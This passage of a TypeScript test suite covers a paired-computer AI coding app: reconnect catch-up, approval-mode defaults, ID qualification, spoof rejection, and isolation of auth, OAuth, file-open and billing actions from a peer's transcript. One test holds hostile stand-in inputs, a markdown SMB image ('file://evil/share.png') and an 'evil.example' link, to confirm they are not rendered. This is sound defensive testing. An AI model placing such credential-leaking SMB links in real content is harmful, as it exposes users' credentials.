        projectId: qMac('proj-a11'),
        worktreeId: qMac('wt-a11'),
        chatId: qMac('chat-a11'),
      };
      const catchUpHost: StaleChatCatchUpHost = {
        current: () => ({
          focused: [catchUpTarget],
          warm: [],
          focusedRuns: [],
          observabilityEntries: false,
        }),
        subscribe: () => (): void => undefined,
        flush: () => Promise.resolve(),
      };
      stopCatchUp = startStaleChatCatchUp(catchUpHost);

      // Disconnect + reconnect #1: marks tab stale and triggers catch-up #1,
      // which FAILS with a transient tunnel error.
      fake.emitState(MAC, { status: 'connecting' });
      fake.emitState(MAC, CONNECTED_FULL);
      await new Promise((resolve) => setTimeout(resolve, 25));
      expect(transcriptPageAttempts).toBe(1);
      expect(getStaleChatCatchUpState(catchUpTarget).error).not.toBeNull();
      const staleTabAfterFailure = useChatStore
        .getState()
        .worktreeChats[
          `${qMac('proj-a11')}/${qMac('wt-a11')}`
        ]?.tabs.find((t) => t.id === qMac('chat-a11'));
      expect(staleTabAfterFailure?.transcriptStale).toBe(true);

      // Disconnect + reconnect #2: new connection epoch clears the failed
      // catch-up entry and retries automatically once the scope refresh settles.
      fake.emitState(MAC, { status: 'connecting' });
      fake.emitState(MAC, CONNECTED_FULL);
      await new Promise((resolve) => setTimeout(resolve, 25));
      expect(transcriptPageAttempts).toBe(2);
      expect(getStaleChatCatchUpState(catchUpTarget).error).toBeNull();
      const recoveredTab = useChatStore
        .getState()
        .worktreeChats[
          `${qMac('proj-a11')}/${qMac('wt-a11')}`
        ]?.tabs.find((t) => t.id === qMac('chat-a11'));
      expect(recoveredTab?.transcriptStale).toBeUndefined();
      expect(
        recoveredTab?.messages.some((m) => m.id === 'm-missed-after-retry'),
      ).toBe(true);

      // 4. Paired composer approval-mode default lookup is keyed to connection
      //    epoch, refetches on reconnect and when composer capability returns,
      //    and shows unresolved state instead of stale cache when lookup fails.
      function PairedApprovalPickerHarness(props: {
        projectId: string;
        worktreeId: string;
      }): ReturnType<typeof createElement> {
        const result = usePairedApprovalModeDefault(
          { projectId: props.projectId, worktreeId: props.worktreeId },
          undefined,
        );
        if (result.isUnresolved) {
          return createElement(
            'span',
            { 'data-testid': 'paired-approval-mode-unresolved' },
            'Approval mode unavailable',
          );
        }
        return createElement(ApprovalModePicker, {
          mode: result.mode ?? 'ask',
          onChange: (): void => undefined,
          disabled: true,
        });
      }

      // Epoch A: host default is 'ask'.
      hostDefaultMode = 'ask';
      failDefaultLookup = false;
      await act(async () => {
        root.render(
          createElement(PairedApprovalPickerHarness, {
            projectId: qMac('proj-a11'),
            worktreeId: qMac('wt-a11'),
          }),
        );
        for (let i = 0; i < 6; i += 1) await Promise.resolve();
      });
      expect(
        container
          .querySelector('[data-testid="approval-mode-icon"]')
          ?.getAttribute('data-approval-mode'),
      ).toBe('ask');

      // Host changes persisted default to 'full-access' between connections.
      hostDefaultMode = 'full-access';
      await act(async () => {
        fake.emitState(MAC, { status: 'connecting' });
        fake.emitState(MAC, CONNECTED_FULL);
        for (let i = 0; i < 6; i += 1) await Promise.resolve();
      });
      expect(
        container
          .querySelector('[data-testid="approval-mode-icon"]')
          ?.getAttribute('data-approval-mode'),
      ).toBe('full-access');

      // Reconnect where lookup fails -> shows unresolved instead of stale 'full-access'.
      failDefaultLookup = true;
      await act(async () => {
        fake.emitState(MAC, { status: 'connecting' });
        fake.emitState(MAC, CONNECTED_FULL);
        for (let i = 0; i < 6; i += 1) await Promise.resolve();
      });
      expect(
        container.querySelector(
          '[data-testid="paired-approval-mode-unresolved"]',
        ),
      ).not.toBeNull();
      expect(
        container.querySelector('[data-testid="approval-mode-picker"]'),
      ).toBeNull();

      // Composer capability drops then returns with host default 'auto' -> refetches and updates.
      failDefaultLookup = false;
      hostDefaultMode = 'auto';
      await act(async () => {
        fake.emitState(MAC, {
          ...CONNECTED_FULL,
          capabilities: ['chats', 'send', 'approvals'],
        });
        await Promise.resolve();
        fake.emitState(MAC, CONNECTED_FULL);
        for (let i = 0; i < 6; i += 1) await Promise.resolve();
      });
      expect(
        container
          .querySelector('[data-testid="approval-mode-icon"]')
          ?.getAttribute('data-approval-mode'),
      ).toBe('auto');
    } finally {
      stopCatchUp?.();
      unsubAutoResolved();
      act(() => {
        root.unmount();
      });
      container.remove();
      (window as { api: unknown }).api = prevApi;
      useChatStore
        .getState()
        .releaseChatScopeRevisioned(qMac('proj-a11'), qMac('wt-a11'));
    }
  });

  test('19. paired transcript blocks qualify asyncQuestion, asyncQuestionAnswer, timer pause owners, and delegation IDs', () => {
    const rawSnapshot: ChatStateSnapshot = {
      schemaVersion: 1,
      projectId: 'proj-q',
      worktreeId: 'wt-q',
      revision: 3,
      tabsFile: {
        version: 1,
        activeTabId: 'chat-q',
        tabs: [
          {
            id: 'chat-q',
            title: 'Question tab',
            createdAt: '2026-11-26T00:00:00.000Z',
            messages: [
              {
                id: 'msg-q',
                role: 'assistant',
                timestamp: 10,
                blocks: [
                  {
                    type: 'text',
                    text: 'Which environment should we deploy?',
                    asyncQuestion: {
                      requestId: 'q-req-1',
                      questions: [
                        {
                          title: 'Target',
                          options: ['staging', 'production'],
                        },
                      ],
                    },
                  },
                  {
                    type: 'text',
                    text: 'staging',
                    asyncQuestionAnswer: {
                      requestId: 'q-req-1',
                      startsTurn: false,
                      answers: [
                        {
                          question: 'Target',
                          selectedOptions: ['staging'],
                        },
                      ],
                    },
                  },
                  {
                    type: 'turn_timer',
                    completedAt: 20,
                    pauseOwnerIds: [
                      'question:q-req-1',
                      'approval:apr-req-1',
                      'timer-transition-1',
                    ],
                  },
                ],
              },
            ],
          },
        ],
        pendingQuestions: [
          {
            requestId: 'q-req-1',
            chatId: 'chat-q',
            questions: [
              {
                question: 'Target',
                options: ['staging', 'production'],
              },
            ],
          },
        ],
      },
      archives: [],
      runtimeByChatId: {},
      queue: [],
    };

    const qualifiedSnapshot = qualifyChatStateSnapshot(MAC, rawSnapshot);
    const qualifiedTab = qualifiedSnapshot.tabsFile.tabs[0];
    const qualifiedPending = qualifiedSnapshot.tabsFile.pendingQuestions?.[0];
    expect(qualifiedPending?.requestId).toBe(qMac('q-req-1'));
    const qBlock = qualifiedTab.messages[0].blocks[0];
    const aBlock = qualifiedTab.messages[0].blocks[1];
    const timerBlock = qualifiedTab.messages[0].blocks[2];
    if (qBlock.type !== 'text') {
      throw new Error('Expected text block for paired asyncQuestion');
    }
    expect(qBlock.asyncQuestion?.requestId).toBe(qMac('q-req-1'));
    expect(qBlock.asyncQuestion?.requestId).toBe(qualifiedPending?.requestId);
    expect(aBlock.type).toBe('text');
    if (aBlock.type === 'text') {
      expect(aBlock.asyncQuestionAnswer?.requestId).toBe(qMac('q-req-1'));
    }
    expect(timerBlock.type).toBe('turn_timer');
    if (timerBlock.type === 'turn_timer') {
      expect(timerBlock.pauseOwnerIds).toEqual([
        `question:${qMac('q-req-1')}`,
        `approval:${qMac('apr-req-1')}`,
        qMac('timer-transition-1'),
      ]);
    }

    // Paged transcript reads must also qualify asyncQuestion / asyncQuestionAnswer IDs.
    const qualifiedPage = sanitizePairedTranscriptPage(MAC, {
      messages: rawSnapshot.tabsFile.tabs[0].messages,
      totalMessages: 1,
      transcriptRevision: 3,
    });
    const pagedQBlock = qualifiedPage.messages[0].blocks[0];
    const pagedABlock = qualifiedPage.messages[0].blocks[1];
    if (pagedQBlock.type === 'text') {
      expect(pagedQBlock.asyncQuestion?.requestId).toBe(qMac('q-req-1'));
    }
    if (pagedABlock.type === 'text') {
      expect(pagedABlock.asyncQuestionAnswer?.requestId).toBe(qMac('q-req-1'));
    }

    // Renderer suppresses duplicate transcript block while the qualified pending question is active.
    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);
    try {
      act(() => {
        root.render(
          createElement(ChatBlockRenderer, {
            block: qBlock,
            streaming: false,
            chatPendingQuestions: [
              {
                requestId: qMac('q-req-1'),
                projectId: qMac('proj-q'),
                worktreeId: qMac('wt-q'),
                chatId: qMac('chat-q'),
                questions: [
                  {
                    question: 'Target',
                    options: ['staging', 'production'],
                  },
                ],
              },
            ],
          }),
        );
      });
      expect(container.textContent).toBe('');

      // Once pending question clears, the transcript block renders.
      act(() => {
        root.render(
          createElement(ChatBlockRenderer, {
            block: qBlock,
            streaming: false,
            chatPendingQuestions: [],
          }),
        );
      });
      expect(container.textContent).toContain(
        'Which environment should we deploy?',
      );
    } finally {
      act(() => {
        root.unmount();
      });
      container.remove();
    }

    // Spoofed already-qualified asyncQuestion requestId targeting another computer is rejected.
    const spoofedSnapshot: ChatStateSnapshot = {
      ...rawSnapshot,
      tabsFile: {
        ...rawSnapshot.tabsFile,
        pendingQuestions: [],
        tabs: [
          {
            ...rawSnapshot.tabsFile.tabs[0],
            messages: [
              {
                id: 'msg-spoof',
                role: 'assistant',
                timestamp: 11,
                blocks: [
                  {
                    type: 'text',
                    text: 'Spoofed',
                    asyncQuestion: {
                      requestId: qLinux('q-spoof'),
                      questions: [{ title: 'Spoof', options: null }],
                    },
                  },
                ],
              },
            ],
          },
        ],
      },
    };
    expect(() => qualifyChatStateSnapshot(MAC, spoofedSnapshot)).toThrow(
      /authority-qualified/i,
    );

    // Approval timerPauseOwnerId, live turn_timer pauseOwnerIds, waitingDelegationIds,
    // and delegationId are all qualified with the source computer.
    const qualifiedApproval = qualifyApprovalRequestEvent(MAC, {
      requestId: 'apr-req-1',
      projectId: 'proj-q',
      worktreeId: 'wt-q',
      chatId: 'chat-q',
      provider: 'claude',
      title: 'Run command',
      details: { kind: 'command', command: 'ls' },
      timerPauseOwnerId: 'timer-transition-1',
    });
    expect(qualifiedApproval.timerPauseOwnerId).toBe(
      qMac('timer-transition-1'),
    );

    const qualifiedLiveEvent = qualifyChatEvent(MAC, {
      projectId: 'proj-q',
      worktreeId: 'wt-q',
      chatId: 'chat-q',
      data: {
        type: 'canopy_user_prompt',
        message: {
          id: 'm-live',
          role: 'assistant',
          timestamp: 12,
          blocks: [
            {
              type: 'turn_timer',
              completedAt: 25,
              pauseOwnerIds: ['question:q-req-1', 'timer-transition-1'],
            },
          ],
        },
      },
    });
    expect(qualifiedLiveEvent.data).toMatchObject({
      type: 'canopy_user_prompt',
      message: {
        blocks: [
          {
            type: 'turn_timer',
            pauseOwnerIds: [
              `question:${qMac('q-req-1')}`,
              qMac('timer-transition-1'),
            ],
          },
        ],
      },
    });

    const qualifiedQueue = qualifyQueueUpdatedEvent(MAC, {
      projectId: 'proj-q',
      worktreeId: 'wt-q',
      chatId: 'chat-q',
      queue: [],
      waitingDelegationIds: ['del-1'],
    });
    expect(qualifiedQueue.waitingDelegationIds).toEqual([qMac('del-1')]);

    const qualifiedDelegationChange = qualifyChatStateChange(MAC, {
      type: 'delegation.card_state_updated',
      chatId: 'chat-q',
      delegationId: 'del-2',
      runGeneration: 1,
      cardRevision: 1,
      streamRevision: 1,
      cardState: {
        version: 2,
        cardRevision: 1,
      },
    });
    if (qualifiedDelegationChange.type === 'delegation.card_state_updated') {
      expect(qualifiedDelegationChange.delegationId).toBe(qMac('del-2'));
    }
  });

  test('20. paired transcripts isolate auth recovery and local renderer sinks, and read-only QuestionPrompt navigates all steps without submitting', async () => {
    const mcpAuthFailure: AuthDependencyFailure = {
      dependencyClass: 'mcp',
      dependencyId: 'mcp:srv-linear:cfg-1',
      displayName: 'Linear',
      failureClass: 'unauthenticated',
      recovery: {
        kind: 'mcp_oauth',
        serverId: 'srv-linear',
        configId: 'cfg-1',
      },
      detail: 'HTTP 401 Unauthorized',
    };

    // 1. translate.ts drops peer authFailure, authFailures, errorCode,
    //    sessionResumeFailure, modelAccessFailure, and canopy_auth_failure.
    const rawSnapshot: ChatStateSnapshot = {
      schemaVersion: 1,
      projectId: 'proj-iso',
      worktreeId: 'wt-iso',
      revision: 1,
      tabsFile: {
        version: 1,
        activeTabId: 'chat-iso',
        tabs: [
          {
            id: 'chat-iso',
            title: 'Isolation tab',
            createdAt: '2026-11-26T00:00:00.000Z',
            messages: [
              {
                id: 'msg-iso',
                role: 'assistant',
                timestamp: 100,
                blocks: [
                  {
                    type: 'text',
                    text: 'Remote auth error',
                    authFailure: mcpAuthFailure,
                    authFailures: [mcpAuthFailure],
                    errorCode: 'claude_ai_credits_fallback_rejected',
                    sessionResumeFailure: {
                      kind: 'resume-failed',
                      provider: 'antigravity',
                      sessionId: 'sess-remote',
                    },
                    modelAccessFailure: {
                      kind: 'model_unsupported',
                      model: 'gpt-5',
                      modelLabel: 'GPT-5',
                    },
                  },
                  {
                    type: 'tool_result',
                    toolUseId: 'tu-mcp',
                    toolName: 'mcp__linear__list_issues',
                    output:
                      'MCP server authentication required (HTTP 401 Unauthorized)',
                    isError: true,
                    authFailure: mcpAuthFailure,
                    authFailures: [mcpAuthFailure],
                  },
                ],
              },
            ],
          },
        ],
      },
      archives: [],
      runtimeByChatId: {},
      queue: [],
    };

    const sanitizedSnapshot = qualifyChatStateSnapshot(MAC, rawSnapshot);
    const sanitizedText =
      sanitizedSnapshot.tabsFile.tabs[0]?.messages[0]?.blocks[0];
    const sanitizedResult =
      sanitizedSnapshot.tabsFile.tabs[0]?.messages[0]?.blocks[1];
    expect(sanitizedText?.type).toBe('text');
    if (sanitizedText?.type === 'text') {
      expect(sanitizedText.authFailure).toBeUndefined();
      expect(sanitizedText.authFailures).toBeUndefined();
      expect(sanitizedText.errorCode).toBeUndefined();
      expect(sanitizedText.sessionResumeFailure).toBeUndefined();
      expect(sanitizedText.modelAccessFailure).toBeUndefined();
    }
    expect(sanitizedResult?.type).toBe('tool_result');
    if (sanitizedResult?.type === 'tool_result') {
      expect(sanitizedResult.authFailure).toBeUndefined();
      expect(sanitizedResult.authFailures).toBeUndefined();
    }

    const sanitizedAuthEvent = qualifyChatEvent(MAC, {
      projectId: 'proj-iso',
      worktreeId: 'wt-iso',
      chatId: 'chat-iso',
      data: {
        type: 'canopy_auth_failure',
        toolUseId: 'tu-mcp',
        provider: 'linear',
        message: 'HTTP 401',
        code: 'unauthenticated',
      },
    });
    expect(sanitizedAuthEvent.data).toEqual({ type: 'paired_dropped_event' });

    // 2. Sink guards: paired AuthRecoveryCard, ChatBlockRenderer text fallbacks
    //    (MCP tool_use 401 + system sign-in + credits fallback + account proxy),
    //    and MessageImages never invoke local MCP probes, OAuth, or file opens.
    const prevFonts = Object.getOwnPropertyDescriptor(document, 'fonts');
    if (!('fonts' in document)) {
      Object.defineProperty(document, 'fonts', {
        configurable: true,
        value: { ready: Promise.resolve() },
      });
    }
    const prevMcpServers = (window as { mcpServers?: unknown }).mcpServers;
    const prevApi = window.api;
    const listStatusSpy = jest.fn().mockResolvedValue([]);
    const checkHealthSpy = jest.fn().mockResolvedValue(undefined);
    const startOAuthLoginSpy = jest.fn().mockResolvedValue({
      status: 'started',
      authorizationUrl: 'https://example.test/oauth',
    });
    const onAuthChangedSpy = jest.fn().mockReturnValue((): void => undefined);
    const openExternalSpy = jest.fn().mockResolvedValue(undefined);
    const openExternalFileSpy = jest.fn().mockResolvedValue(undefined);
    (window as { mcpServers?: unknown }).mcpServers = {
      listStatus: listStatusSpy,
      checkHealth: checkHealthSpy,
      startOAuthLogin: startOAuthLoginSpy,
      onAuthChanged: onAuthChangedSpy,
    };
    window.api = {
      ...prevApi,
      openExternalFile: openExternalFileSpy,
      browser: {
        ...prevApi.browser,
        openExternal: openExternalSpy,
      },
    };

    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);
    try {
      // 2a. Paired AuthRecoveryCard with structured mcp_oauth renders display-only
      //     notice and never reaches window.mcpServers or browser.openExternal.
      await act(async () => {
        root.render(
          createElement(ChatMarkdownFileTargetContext.Provider, {
            value: { projectId: qMac('proj-iso'), worktreeId: qMac('wt-iso') },
            children: createElement(AuthRecoveryCard, {
              failures: [mcpAuthFailure],
              originChatTabId: qMac('chat-iso'),
              sourceMessageId: 'msg-iso',
            }),
          }),
        );
        await Promise.resolve();
      });
      const pairedNotice = container.querySelector(
        '[data-testid="paired-auth-recovery-notice"]',
      );
      expect(pairedNotice).not.toBeNull();
      expect(pairedNotice?.textContent).toContain(
        'Sign in on the paired computer',
      );
      expect(pairedNotice?.textContent).toContain('Linear');
      expect(
        container.querySelector('[data-testid="auth-recovery-card"]'),
      ).toBeNull();
      expect(container.querySelectorAll('button')).toHaveLength(0);
      expect(listStatusSpy).not.toHaveBeenCalled();
      expect(checkHealthSpy).not.toHaveBeenCalled();
      expect(startOAuthLoginSpy).not.toHaveBeenCalled();
      expect(onAuthChangedSpy).not.toHaveBeenCalled();
      expect(openExternalSpy).not.toHaveBeenCalled();

      // 2b. Paired ChatBlockRenderer text-fallback paths:
      //     (i) errored MCP tool_use (401 heuristic), (ii) system Claude sign-in,
      //     (iii) credits fallback errorCode, (iv) MessageImages local file open.
      await act(async () => {
        root.render(
          createElement(ChatMarkdownFileTargetContext.Provider, {
            value: { projectId: qMac('proj-iso'), worktreeId: qMac('wt-iso') },
            children: createElement(
              'div',
              null,
              createElement(ChatBlockRenderer, {
                block: {
                  type: 'tool_use',
                  toolUseId: 'tu-mcp',
                  toolName: 'mcp__linear__list_issues',
                  input: '{}',
                  result: {
                    toolUseId: 'tu-mcp',
                    output:
                      'MCP server authentication required (HTTP 401 Unauthorized)',
                    isError: true,
                  },
                },
                streaming: false,
                originChatTabId: qMac('chat-iso'),
              }),
              createElement(ChatBlockRenderer, {
                block: {
                  type: 'text',
                  text: "You're not signed in to Claude.",
                },
                streaming: false,
                isSystemMessage: true,
                originChatTabId: qMac('chat-iso'),
              }),
              createElement(ChatBlockRenderer, {
                block: {
                  type: 'text',
                  text: 'Fallback credits notice',
                  errorCode: 'claude_ai_credits_fallback_rejected',
                },
                streaming: false,
                originChatTabId: qMac('chat-iso'),
              }),
              createElement(MessageImages, {
                attachments: [
                  { kind: 'file', absolutePath: '/Users/peer/secret.pdf' },
                ],
              }),
            ),
          }),
        );
        await Promise.resolve();
      });
      const pairedNotices = container.querySelectorAll(
        '[data-testid="paired-auth-recovery-notice"]',
      );
      expect(pairedNotices.length).toBeGreaterThanOrEqual(2);
      expect(
        container.querySelector('[data-testid="auth-recovery-card"]'),
      ).toBeNull();
      expect(
        container.querySelector('[data-testid="chat-connection-cta-mcp"]'),
      ).toBeNull();
      expect(
        container.querySelector('[data-testid="chat-connection-cta-claude"]'),
      ).toBeNull();
      expect(listStatusSpy).not.toHaveBeenCalled();
      expect(checkHealthSpy).not.toHaveBeenCalled();
      expect(startOAuthLoginSpy).not.toHaveBeenCalled();
      expect(openExternalFileSpy).not.toHaveBeenCalled();

      // 2c. Local-scope positive control: same structured mcp_oauth failure
      //     mounts AuthRecoveryCard, probes window.mcpServers.listStatus, and
      //     launches window.mcpServers.startOAuthLogin on CTA click.
      await act(async () => {
        root.render(
          createElement(ChatMarkdownFileTargetContext.Provider, {
            value: { projectId: 'local-proj', worktreeId: 'local-wt' },
            children: createElement(AuthRecoveryCard, {
              failures: [mcpAuthFailure],
              originChatTabId: 'local-chat',
              sourceMessageId: 'msg-local',
            }),
          }),
        );
        await Promise.resolve();
      });
      expect(
        container.querySelector('[data-testid="auth-recovery-card"]'),
      ).not.toBeNull();
      expect(listStatusSpy).toHaveBeenCalledTimes(1);
      const localCta = container.querySelector<HTMLButtonElement>(
        '[data-testid="chat-connection-cta-mcp"]',
      );
      expect(localCta).not.toBeNull();
      await act(async () => {
        localCta?.click();
        await Promise.resolve();
      });
      expect(startOAuthLoginSpy).toHaveBeenCalledWith({
        serverId: 'srv-linear',
        configId: 'cfg-1',
      });

      // 3. Finding 2: read-only multi-question QuestionPrompt navigates all
      //    steps while answer controls remain locked, plainTextQuestion stays
      //    active on every step, and onSubmit is never invoked.
      const onSubmitSpy = jest.fn();
      function ReadOnlyMultiQuestionHost(): ReturnType<typeof createElement> {
        const prompt = useQuestionPrompt({
          requestId: 'req-ro-multi',
          questions: [
            {
              question: 'Step 1: Choose environment',
              options: ['Staging', 'Production'],
            },
            {
              question: 'Step 2: Inspect ![smb](file://evil/share.png)',
              options: ['Approve', 'Reject'],
            },
            {
              question: 'Step 3: Review [link](https://evil.example)',
              options: [],
              control: 'number',
            },
          ],
          onSubmit: onSubmitSpy,
        });
        return createElement(QuestionPrompt, {
          prompt,
          busy: null,
          errorKind: null,
          readOnlyHint: 'Answer on the paired computer.',
          plainTextQuestion: true,
          onClose: (): void => undefined,
          onRetry: (): void => undefined,
          children: createElement('div'),
        });
      }

      await act(async () => {
        root.render(createElement(ReadOnlyMultiQuestionHost));
        await Promise.resolve();
      });
      expect(container.textContent).toContain('Step 1: Choose environment');
      const step1Option = container.querySelector<HTMLButtonElement>(
        '[data-testid="chat-question-option-0"]',
      );
      expect(step1Option?.disabled).toBe(true);
      expect(
        container.querySelector('[data-testid="chat-question-back"]'),
      ).toBeNull();
      const nextBtn1 = container.querySelector<HTMLButtonElement>(
        '[data-testid="chat-question-next"]',
      );
      expect(nextBtn1).not.toBeNull();
      expect(nextBtn1?.disabled).toBe(false);

      // Locked option click does nothing.
      await act(async () => {
        step1Option?.click();
        await Promise.resolve();
      });
      expect(container.textContent).toContain('Step 1: Choose environment');
      expect(onSubmitSpy).not.toHaveBeenCalled();

      // Advance to Step 2.
      await act(async () => {
        nextBtn1?.click();
        await Promise.resolve();
      });
      expect(container.textContent).toContain(
        'Step 2: Inspect ![smb](file://evil/share.png)',
      );
      expect(container.querySelectorAll('img')).toHaveLength(0);
      expect(
        container.querySelector<HTMLButtonElement>(
          '[data-testid="chat-question-option-0"]',
        )?.disabled,
      ).toBe(true);
      const backBtn2 = container.querySelector<HTMLButtonElement>(
        '[data-testid="chat-question-back"]',
      );
      expect(backBtn2?.disabled).toBe(false);

      // Advance to Step 3 (final step).
      await act(async () => {
        container
          .querySelector<HTMLButtonElement>(
            '[data-testid="chat-question-next"]',
          )
          ?.click();
        await Promise.resolve();
      });
      expect(container.textContent).toContain(
        'Step 3: Review [link](https://evil.example)',
      );
      expect(container.querySelectorAll('a')).toHaveLength(0);
      expect(
        container.querySelector<HTMLInputElement>(
          '[data-testid="chat-question-field"]',
        )?.disabled,
      ).toBe(true);
      expect(
        container.querySelector<HTMLButtonElement>(
          '[data-testid="chat-question-next"]',
        )?.disabled,
      ).toBe(true);

      // Step back from Step 3 to Step 2.
      await act(async () => {
        container
          .querySelector<HTMLButtonElement>(
            '[data-testid="chat-question-back"]',
          )
          ?.click();
        await Promise.resolve();
      });
      expect(container.textContent).toContain(
        'Step 2: Inspect ![smb](file://evil/share.png)',
      );
      expect(
        container.querySelector<HTMLButtonElement>(
          '[data-testid="chat-question-next"]',
        )?.disabled,
      ).toBe(false);
      expect(onSubmitSpy).not.toHaveBeenCalled();
    } finally {
      act(() => {
        root.unmount();
      });
      container.remove();
      (window as { mcpServers?: unknown }).mcpServers = prevMcpServers;
      window.api = prevApi;
      if (prevFonts) {
        Object.defineProperty(document, 'fonts', prevFonts);
      } else {
        delete (document as { fonts?: unknown }).fonts;
      }
    }
  });

  test('21. paired tab/runtime/event allowlists drop billing and recovery keys and paired usage-limit banners never reach openBillingPage', async () => {
    // 1. qualifyChatStateSnapshot strips billing, quota, recovery, handoff,
    //    auto-archive, and host-mutation keys from tabs and runtime state while
    //    preserving display-only metadata.
    const rawSnapshot: ChatStateSnapshot = {
      schemaVersion: 1,
      projectId: 'proj-bill',
      worktreeId: 'wt-bill',
      revision: 4,
      tabsFile: {
        version: 1,
        activeTabId: 'chat-bill',
        tabs: [
          {
            id: 'chat-bill',
            title: 'Billing audit tab',
            customTitle: 'Custom paired title',
            model: 'claude-sonnet-4-6',
            modelSelectionMode: 'auto',
            providerType: 'claude',
            approvalMode: 'ask',
            planMode: true,
            thinkingLevel: 'high',
            autoRoutedModels: { 'm-1': 'claude-sonnet-4-6' },
            createdAt: '2026-11-26T00:00:00.000Z',
            messages: [],
            llmProviderUsageLimitBanner: {
              provider: 'claude',
              dismissKey: 'claude:12345',
              message: 'Claude usage limit reached',
              detectedAt: 100,
              resetsAt: 1_900_000_000_000,
            },
            dismissedLlmProviderUsageLimitBannerKey: 'claude:old',
            aiCreditsNoBillingSource: {
              provider: 'claude',
              detectedAt: 100,
            },
            aiCreditsRouting: {
              active: true,
              activatedAt: 100,
              scope: 'session',
              resetsAt: 1_900_000_000_000,
            },
            aiCreditsRouted: true,
            subscriptionBillingOverride: true,
            billingExplicitlyChosen: true,
            staleSessionDetected: { droppedMessageText: 'Hello' },
            importedFrom: 'claude',
            autoArchive: true,
            autoArchiveTurnId: 'turn-9',
            sessionApprovalRules: [
              {
                id: 'rule-1',
                target: { kind: 'command', pattern: 'ls' },
                behavior: 'allow',
                origin: 'prompt',
                createdAt: '2026-11-26T00:00:00.000Z',
              },
            ],
            proposalMode: 'required',
            retainedCodexSpeed: 'fast',
            modelExplicitlyChosen: true,
            defaultStampModel: 'claude-sonnet-4-6',
            executionHarnessExplicitlyChosen: true,
          },
        ],
      },
      archives: [],
      runtimeByChatId: {
        'chat-bill': {
          status: 'idle',
          queuedMessageIds: [],
          emptyCompletionRecovery: {
            turnUserMessageId: 'u-1',
            detectedAt: 100,
            automaticRetryAllowed: false,
          },
          deferredToolsReload: 'resuming',
        },
      },
      queue: [],
    };

    const sanitizedSnapshot = qualifyChatStateSnapshot(MAC, rawSnapshot);
    const sanitizedTab = sanitizedSnapshot.tabsFile.tabs[0];
    expect(sanitizedTab).toBeDefined();
    expect(sanitizedTab?.title).toBe('Billing audit tab');
    expect(sanitizedTab?.customTitle).toBe('Custom paired title');
    expect(sanitizedTab?.model).toBe('claude-sonnet-4-6');
    expect(sanitizedTab?.modelSelectionMode).toBe('auto');
    expect(sanitizedTab?.providerType).toBe('claude');
    expect(sanitizedTab?.approvalMode).toBe('ask');
    expect(sanitizedTab?.planMode).toBe(true);
    expect(sanitizedTab?.thinkingLevel).toBe('high');
    expect(sanitizedTab?.autoRoutedModels).toEqual({
      'm-1': 'claude-sonnet-4-6',
    });

    expect(sanitizedTab?.llmProviderUsageLimitBanner).toBeUndefined();
    expect(
      sanitizedTab?.dismissedLlmProviderUsageLimitBannerKey,
    ).toBeUndefined();
    expect(sanitizedTab?.aiCreditsNoBillingSource).toBeUndefined();
    expect(sanitizedTab?.aiCreditsRouting).toBeUndefined();
    expect(sanitizedTab?.aiCreditsRouted).toBeUndefined();
    expect(sanitizedTab?.subscriptionBillingOverride).toBeUndefined();
    expect(sanitizedTab?.billingExplicitlyChosen).toBeUndefined();
    expect(sanitizedTab?.staleSessionDetected).toBeUndefined();
    expect(sanitizedTab?.importedFrom).toBeUndefined();
    expect(sanitizedTab?.autoArchive).toBeUndefined();
    expect(sanitizedTab?.autoArchiveTurnId).toBeUndefined();
    expect(sanitizedTab?.sessionApprovalRules).toBeUndefined();
    expect(sanitizedTab?.proposalMode).toBeUndefined();
    expect(sanitizedTab?.retainedCodexSpeed).toBeUndefined();
    expect(sanitizedTab?.modelExplicitlyChosen).toBeUndefined();
    expect(sanitizedTab?.defaultStampModel).toBeUndefined();
    expect(sanitizedTab?.executionHarnessExplicitlyChosen).toBeUndefined();

    const sanitizedRuntime =
      sanitizedSnapshot.runtimeByChatId[qMac('chat-bill')];
    expect(sanitizedRuntime?.emptyCompletionRecovery).toBeUndefined();
    expect(sanitizedRuntime?.deferredToolsReload).toBeUndefined();

    // 2. tab.metadata_patched and live ai_credits_routing_status also drop
    //    billing, auto-archive, and host-mutation fields.
    const sanitizedPatch = qualifyChatStateChange(MAC, {
      type: 'tab.metadata_patched',
      tabId: 'chat-bill',
      patch: {
        title: 'Patched title',
        billingExplicitlyChosen: true,
        autoArchive: true,
        autoArchiveTurnId: 'turn-9',
        sessionApprovalRules: [],
        proposalMode: 'optional',
        retainedCodexSpeed: 'fast',
        modelExplicitlyChosen: true,
        defaultStampModel: 'claude-sonnet-4-6',
        executionHarnessExplicitlyChosen: true,
      },
    });
    expect(sanitizedPatch.type).toBe('tab.metadata_patched');
    if (sanitizedPatch.type === 'tab.metadata_patched') {
      expect(sanitizedPatch.patch.title).toBe('Patched title');
      expect(sanitizedPatch.patch.billingExplicitlyChosen).toBeUndefined();
      expect(sanitizedPatch.patch.autoArchive).toBeUndefined();
      expect(sanitizedPatch.patch.autoArchiveTurnId).toBeUndefined();
      expect(sanitizedPatch.patch.sessionApprovalRules).toBeUndefined();
      expect(sanitizedPatch.patch.proposalMode).toBeUndefined();
      expect(sanitizedPatch.patch.retainedCodexSpeed).toBeUndefined();
      expect(sanitizedPatch.patch.modelExplicitlyChosen).toBeUndefined();
      expect(sanitizedPatch.patch.defaultStampModel).toBeUndefined();
      expect(
        sanitizedPatch.patch.executionHarnessExplicitlyChosen,
      ).toBeUndefined();
    }

    const sanitizedRoutingEvent = qualifyChatEvent(MAC, {
      projectId: 'proj-bill',
      worktreeId: 'wt-bill',
      chatId: 'chat-bill',
      data: {
        type: 'ai_credits_routing_status',
        active: true,
        accountProxyRouted: false,
      },
    });
    expect(sanitizedRoutingEvent.data).toEqual({
      type: 'paired_dropped_event',
    });

    // 3. Sink guard + local-scope positive control: a paired target with a
    //    usage-limit banner never renders a purchase CTA or invokes
    //    openBillingPage, whereas a local target renders the CTA and invokes
    //    openBillingPage on click.
    const prevApi = window.api;
    const loadCloudAccountSpy = jest.fn().mockResolvedValue({
      read: 'ok',
      hasApiKey: true,
      account: {
        id: 'acc-local',
        email: 'user@example.test',
        isGuest: false,
      },
    });
    const loadAvailabilitySpy = jest.fn().mockResolvedValue({
      personalEligible: false,
      inOrg: false,
      orgCreditPoolCovered: false,
      orgSpendable: false,
    });
    window.api = {
      ...prevApi,
      loadCanopyCloudAccount: loadCloudAccountSpy,
      loadNativeAiCreditsAvailability: loadAvailabilitySpy,
      localModelGateway: {
        ...prevApi.localModelGateway,
